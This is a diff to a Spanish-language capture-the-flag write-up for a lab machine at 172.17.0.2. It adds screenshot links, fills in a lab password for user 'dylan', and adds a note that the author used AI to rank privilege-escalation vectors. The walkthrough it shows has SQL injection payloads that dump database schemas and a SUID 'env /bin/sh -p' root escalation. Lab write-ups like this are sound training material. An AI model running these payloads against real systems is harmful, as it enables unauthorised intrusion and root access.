@@ -11,7 +11,7 @@ Comenzamos realizando un escaneo con `nmap` sobre la máquina objetivo para iden
 ```bash
 sudo nmap -sS -Pn -n -sC -sV --top-ports 50 --open 172.17.0.2
 ```
-![02](Screenshot/02.png)
+![02](Screenshots/02.png)
 
 El escaneo muestra dos puertos abiertos:
 
@@ -41,6 +41,7 @@ Para comprobar el número de columnas de la consulta, se puede utilizar `ORDER B
 ' order by 2-- -
 ' order by 3-- -
 ```
+![05](Screenshots/05.png)
 
 Al fallar con `ORDER BY 3`, sabemos que la consulta original devuelve 2 columnas.
 
@@ -53,14 +54,17 @@ La payload utilizada fue la siguiente:
 ```sql
 2379873' union select group_concat(schema_name),2 from information_schema.schemata-- -
 ```
+![06](Screenshots/06.png)
 
 Con esta cadena conseguimos acceder al panel y obtener credenciales válidas para el usuario `dylan`.
+
+![07](Screenshots/07.png)
 
 Credenciales obtenidas:
 
 ```text
 Usuario: dylan
-Contraseña: [AÑADIR_CONTRASEÑA]
+Contraseña: KJSDFG789FGSDF78
 ```
 
 ## Acceso inicial por SSH
@@ -72,6 +76,8 @@ ssh dylan@172.17.0.2
 ```
 
 Introducimos la contraseña obtenida previamente y conseguimos acceso al sistema como el usuario `dylan`.
+
+![08](Screenshots/08.png)
 
 ## Enumeración local
 
@@ -88,12 +94,17 @@ Buscamos binarios con permisos SUID mediante el siguiente comando:
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
+![09](Screenshots/09.png)
+
 
 Entre los binarios encontrados, detectamos `/usr/bin/env` con permisos SUID:
 
 ```text
 -rwsr-xr-x root root /usr/bin/env
 ```
+
+> [!NOTE]
+> Para agilizar el análisis de los binarios SUID encontrados, utilicé IA como apoyo para priorizar posibles vectores de escalada. Tras identificar `/usr/bin/env` como candidato interesante, validé la técnica consultando GTFOBins y comprobando su comportamiento en la máquina.
 
 ## Escalada de privilegios
 
@@ -104,6 +115,7 @@ Según GTFOBins, si `env` tiene permisos SUID, podemos ejecutar una shell privil
 ```bash
 env /bin/sh -p
 ```
+![10](Screenshots/10.png)
 
 Tras ejecutar el comando, comprobamos nuestra identidad efectiva:
 
@@ -128,6 +140,7 @@ Finalmente, verificamos que tenemos acceso al directorio `/root`:
 ```bash
 ls -la /root
 ```
+![11](Screenshots/11.png)
 
 Podemos listar el contenido del directorio, confirmando que la escalada de privilegios se ha realizado correctamente.
 
